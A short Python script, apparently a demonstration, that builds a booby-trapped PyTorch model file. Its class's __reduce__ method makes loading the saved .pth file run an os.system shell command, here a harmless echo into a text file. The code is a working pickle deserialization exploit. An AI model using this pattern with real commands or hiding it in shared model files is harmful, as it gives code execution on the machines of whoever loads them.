from torch import nn
import torch
import os

class MaliciousModel:

    def __reduce__(self):
        print("Reduce called!")  # 應該會印出
        return (os.system, ("echo 'This is a malicious model!' > malicious_output.txt",))
    
if __name__ == "__main__":
    model = MaliciousModel()

    # save the model
    torch.save(model, "malicious_model.pth")